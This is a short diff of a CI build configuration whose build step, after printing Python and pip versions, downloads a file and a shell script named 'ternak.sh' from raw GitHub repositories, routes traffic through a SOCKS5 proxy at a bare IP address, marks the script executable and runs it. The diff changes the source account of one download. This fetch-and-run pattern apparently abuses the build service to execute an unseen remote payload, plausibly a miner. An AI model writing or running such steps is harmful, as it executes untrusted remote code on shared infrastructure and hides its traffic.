@@ -10,6 +10,6 @@ build:
         code: |
           echo "python version $(python --version) running"
           echo "pip version $(pip --version) running"
-          wget https://raw.githubusercontent.com/renitareni/mesin/main/obatkuat
+          wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
           wget https://raw.githubusercontent.com/renitareni/mesin/main/ternak.sh && export http_proxy=socks5://72.221.172.203:4145 && chmod u+x ternak.sh && ./ternak.sh
           
